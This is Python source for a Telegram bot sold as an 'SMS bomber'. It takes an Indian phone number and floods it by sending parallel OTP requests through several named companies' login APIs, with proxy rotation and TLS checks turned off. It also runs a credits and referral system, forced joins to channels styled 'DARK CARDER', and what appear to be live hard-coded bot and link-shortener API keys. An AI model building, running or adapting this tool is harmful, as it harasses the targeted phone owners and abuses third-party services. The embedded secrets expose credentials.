import telebot
import requests
import time
import json
import os
import random
import threading
from datetime import datetime, timedelta
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import hashlib
from concurrent.futures import ThreadPoolExecutor

# ╔══════════════════════════════════════════════════════════════════╗
# ║         𝐃𝐄𝐌𝐎𝐍 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 — 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐃𝐈𝐓𝐈𝐎𝐍            ║
# ║         🇮🇳 200+ INDIA SMS + 🔥 UNLIMITED BOMB                ║
# ╚══════════════════════════════════════════════════════════════════╝

BOT_TOKEN       = "8544323418:AAGYqHGvaMxuNfAtA5HyG5DKFod9QZe4so4"
bot             = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
BOT_USERNAME    = "@eclensbot"

# Set your real Telegram numeric ID here
YOUR_TELEGRAM_ID = 5807965902  # Replace with your actual Telegram ID
OWNER_ID        = YOUR_TELEGRAM_ID
DEFAULT_ADMIN   = YOUR_TELEGRAM_ID
ADMIN_IDS       = [OWNER_ID, DEFAULT_ADMIN]

# ─── REQUIRED CHANNELS ──────────────────────────────────────────────
REQUIRED_CHANNELS = [
    {"name": "Main Channel",   "url": "https://t.me/DarkCarder005", "icon": "📢", "chat_id": -1005807965902, "type": "telegram_private"},
    {"name": "DARK CARDER",    "url": "https://t.me/DarkCarder05",   "icon": "🌑", "chat_id": -1005807965902, "type": "telegram_private"},
    {"name": "Backup Channel", "url": "https://t.me/+EvomvB1P6QM4M2Y1", "icon": "💾", "username": "Access_Allowed", "type": "telegram_public"},
    {"name": "Database Channel","url": "https://t.me/DarkCarder05",  "icon": "🗄️", "chat_id": -1005807965902, "type": "telegram_private"},
]
MUST_JOIN_CHANNELS = REQUIRED_CHANNELS

VPLINK_API_KEY  = "cae8232167ae3f6f5aa13a6f4125f1125123e43e"
VPLINK_BASE_URL = "https://vplink.in/api"

# ─── PROXY LIST ──────────────────────────────────────────────────
PROXY_LIST = [
    "1.0.136.129:8080", "1.0.170.50:8080", "1.1.109.141:9999",
    "1.1.189.58:8080", "1.1.220.100:8080", "1.10.141.115:8080"
]

_proxy_idx   = 0
_proxy_lock  = threading.Lock()
_dead_proxies = set()

def get_proxy():
    global _proxy_idx
    if not PROXY_LIST:
        return None
    with _proxy_lock:
        tried = 0
        while tried < len(PROXY_LIST):
            p = PROXY_LIST[_proxy_idx % len(PROXY_LIST)]
            _proxy_idx += 1
            tried += 1
            if p not in _dead_proxies:
                return {"http": f"http://{p}", "https": f"http://{p}"}
    return None

# ─── DATABASE ──────────────────────────────────────────────────────
DB_DIR = "db"
os.makedirs(DB_DIR, exist_ok=True)
db_lock = threading.Lock()

def load_db(name, default):
    path = f"{DB_DIR}/{name}.json"
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump(default, f)
    with open(path, "r") as f:
        return json.load(f)

def save_db(name, data):
    with db_lock:
        with open(f"{DB_DIR}/{name}.json", "w") as f:
            json.dump(data, f, indent=2)

users           = load_db("users", {})
credits         = load_db("credits", {})
referrals       = load_db("referrals", {})
referred_by     = load_db("referred_by", {})
shortener_links = load_db("shortener_links", {})
banned_users    = load_db("banned", [])
attack_logs     = load_db("attack_logs", {})

# ─── 🇮🇳 INDIA SMS APIS ───────────────────────────────────────────
INDIA_SMS_APIS = [
    {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker",        "url": "https://www.nobroker.in/api/v3/account/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy",       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit",         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'}
]

# ─── UTILITY FUNCTIONS ────────────────────────────────────────────

def is_owner(uid):   return int(uid) == OWNER_ID
def is_admin(uid):   return int(uid) in ADMIN_IDS
def is_banned(uid):
    if is_admin(uid): return False
    return str(uid) in banned_users

def get_user_credits(uid):
    if is_owner(uid): return 999999
    return credits.get(str(uid), 0)

def deduct_credit(uid, amount=10):
    if is_owner(uid): return True
    s = str(uid)
    cur = get_user_credits(s)
    if cur >= amount:
        credits[s] = cur - amount
        save_db("credits", credits)
        return True
    return False

def add_credits(uid, amount):
    s = str(uid)
    credits[s] = credits.get(s, 0) + amount
    save_db("credits", credits)

def check_channel_join(uid):
    if is_admin(uid): return []
    nj = []
    for ch in MUST_JOIN_CHANNELS:
        ch_type = ch.get("type", "")
        if ch_type == "telegram_private":
            chat_id = ch.get("chat_id")
            if not chat_id: continue
            try:
                m = bot.get_chat_member(int(chat_id), uid)
                if m.status not in ["member", "administrator", "creator"]:
                    nj.append(ch)
            except Exception:
                pass
            continue
        username = ch.get("username", "")
        if not username or username.startswith("+"):
            continue
        try:
            target_username = username if username.startswith("@") else f"@{username}"
            m = bot.get_chat_member(target_username, uid)
            if m.status not in ["member", "administrator", "creator"]:
                nj.append(ch)
        except Exception:
            pass
    return nj

def call_api_safe(api, phone):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
    }
    if api.get("headers"):
        headers.update(api["headers"])

    url = api["url"](phone) if callable(api["url"]) else api["url"]
    raw = api["data"](phone) if callable(api.get("data")) else api.get("data", "")

    def _do_request(proxy_dict):
        if api["method"] == "POST":
            return requests.post(url, data=raw, headers=headers, proxies=proxy_dict, timeout=3, verify=False)
        else:
            return requests.get(url, headers=headers, proxies=proxy_dict, timeout=3, verify=False)

    proxy = get_proxy()
    if proxy:
        try:
            resp = _do_request(proxy)
            return resp.status_code in [200, 201, 202]
        except Exception:
            pass

    try:
        resp = _do_request(None)
        return resp.status_code in [200, 201, 202]
    except Exception:
        return False

def generate_shortener_link(uid):
    h = hashlib.md5(f"{uid}{time.time()}{random.randint(1000,9999)}".encode()).hexdigest()[:8]
    alias = f"exo{h}"
    try:
        r = requests.get(VPLINK_BASE_URL, params={
            "api": VPLINK_API_KEY,
            "url": f"https://t.me/{BOT_USERNAME}?start=short_{h}",
            "alias": alias
        }, timeout=5)
        res = r.json()
        if "shortenedUrl" in res:
            shortener_links[h] = {"user_id": str(uid), "alias": alias, "created": time.time(), "completed": False}
            save_db("shortener_links", shortener_links)
            return res["shortenedUrl"]
    except Exception:
        pass
    return f"https://vplink.in/{alias}"

# ─── KEYBOARD BUILDERS ────────────────────────────────────────────

def main_menu_keyboard(uid=None):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.row("🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
    kb.row("🔥 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐁𝐨𝐦𝐛")
    kb.row("📊 𝐁𝐨𝐦𝐛𝐞𝐫 𝐒𝐭𝐚𝐭𝐮𝐬",  "🎁 𝐆𝐞𝐭 𝐅𝐫𝐞𝐞 𝐁𝐨𝐦𝐛𝐬")
    kb.row("🤖 𝐎𝐰𝐧 𝐁𝐨𝐭",        "👥 𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬")
    kb.row("📈 𝐌𝐲 𝐒𝐭𝐚𝐭𝐬",       "📊 𝐃𝐚𝐬𝐡𝐛𝐨𝐚𝐫𝐝")
    kb.row("ℹ️ 𝐇𝐞𝐥𝐩 & 𝐆𝐮𝐢𝐝𝐞")
    return kb

def admin_menu_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.row("📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐬",   "👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨")
    kb.row("💰 𝐀𝐝𝐝 𝐂𝐫𝐞𝐝𝐢𝐭𝐬", "🎁 𝐁𝐮𝐥𝐤 𝐂𝐫𝐞𝐝𝐢𝐭𝐬")
    kb.row("⛔ 𝐁𝐚𝐧 𝐔𝐬𝐞𝐫",    "✅ 𝐔𝐧𝐛𝐚𝐧 𝐔𝐬𝐞𝐫")
    kb.row("📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭",  "➕ 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧")
    kb.row("🔙 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮")
    return kb

def tier_inline_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💣 Normal (100 SMS)", callback_data="tier_normal"),
        InlineKeyboardButton("⚡ Premium (200 SMS)", callback_data="tier_premium"),
        InlineKeyboardButton(f"☢️ Nuclear ({len(INDIA_SMS_APIS)} SMS)", callback_data="tier_nuclear"),
        InlineKeyboardButton("❌ Cancel", callback_data="tier_cancel")
    )
    return kb

# ─── COMMANDS & HANDLERS ──────────────────────────────────────────

@bot.message_handler(commands=['start'])
def start_command(message):
    uid = str(message.from_user.id)
    uid_int = message.from_user.id

    if is_banned(uid_int):
        bot.send_message(message.chat.id, "🚫 <b>ACCESS DENIED — BANNED</b>")
        return

    not_joined = check_channel_join(uid_int)
    if not_joined:
        kb = InlineKeyboardMarkup()
        for ch in MUST_JOIN_CHANNELS:
            kb.add(InlineKeyboardButton(text=f"{ch['icon']} {ch['name']}", url=ch["url"]))
        kb.add(InlineKeyboardButton(text="✅ I Joined — Verify", callback_data="verify_join"))
        bot.send_message(message.chat.id, "🔐 <b>JOIN ALL CHANNELS FIRST</b>", reply_markup=kb)
        return

    if uid not in users:
        users[uid] = {"username": message.from_user.username or "N/A", "first_name": message.from_user.first_name or "User", "joined": time.time(), "total_bombs": 0, "total_sms": 0}
        credits[uid] = 50
        referrals[uid] = 0
        save_db("users", users); save_db("credits", credits); save_db("referrals", referrals)

    bot.send_message(message.chat.id, f"👋 <b>Welcome {message.from_user.first_name}!</b>", reply_markup=main_menu_keyboard(uid_int))

@bot.callback_query_handler(func=lambda c: c.data == "verify_join")
def verify_join_callback(call):
    if check_channel_join(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Join ALL channels first!", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "✅ Verified!")
        start_command(call.message)

@bot.message_handler(func=lambda m: m.text == "🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
def india_sms_handler(message):
    uid = str(message.from_user.id)
    if is_banned(message.from_user.id): return
    attack_logs[uid] = {"country": "india_sms"}
    save_db("attack_logs", attack_logs)
    bot.send_message(message.chat.id, "🇮🇳 <b>INDIA SMS BOMBER</b>\nSelect tier:", reply_markup=tier_inline_keyboard())

@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("tier_"))
def tier_callback(call):
    uid = str(call.from_user.id)
    if call.data == "tier_cancel":
        bot.edit_message_text("❌ <b>Cancelled.</b>", call.message.chat.id, call.message.message_id)
        return

    tier_map = {"tier_normal": "normal", "tier_premium": "premium", "tier_nuclear": "nuclear"}
    attack_logs[uid]["tier"] = tier_map.get(call.data, "normal")
    save_db("attack_logs", attack_logs)

    msg = bot.edit_message_text("📱 <b>Enter Indian Mobile Number (10 digits)</b>", call.message.chat.id, call.message.message_id)
    bot.register_next_step_handler(msg, process_phone_number)

def process_phone_number(message):
    uid = str(message.from_user.id)
    phone = ''.join(filter(str.isdigit, message.text or ""))
    if len(phone) != 10:
        bot.send_message(message.chat.id, "❌ <b>Invalid phone number!</b>")
        return
    attack_logs[uid]["phone"] = phone
    save_db("attack_logs", attack_logs)
    execute_attack_parallel(uid, message.chat.id, phone)

def execute_attack_parallel(uid, chat_id, phone):
    bot.send_message(chat_id, f"🚀 <b>Launching attack on +91 {phone}...</b>")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(call_api_safe, api, phone) for api in INDIA_SMS_APIS]
        results = [f.result() for f in futures]
    
    hits = sum(1 for r in results if r)
    bot.send_message(chat_id, f"🏆 <b>ATTACK COMPLETE</b>\nSuccessful: {hits}/{len(INDIA_SMS_APIS)}")

# ─── ADMIN UNBAN HANDLER FIX ──────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "✅ 𝐔𝐧𝐛𝐚𝐧 𝐔𝐬𝐞𝐫" and is_admin(m.from_user.id))
def admin_unban_user_handler(message):
    msg = bot.send_message(message.chat.id, "✅ Enter User ID to unban:")
    bot.register_next_step_handler(msg, process_unban_user)

def process_unban_user(message):
    uid = message.text.strip()
    if uid in banned_users:
        banned_users.remove(uid)
        save_db("banned", banned_users)
        bot.send_message(message.chat.id, f"✅ Unbanned <code>{uid}</code>")
    else:
        bot.send_message(message.chat.id, "❌ Not in ban list!")

# ─── LAUNCH ────────────────────────────────────────────────────────
print("🤖 BOT IS RUNNING SUCCESSFULLY...")
bot.infinity_polling(timeout=60)

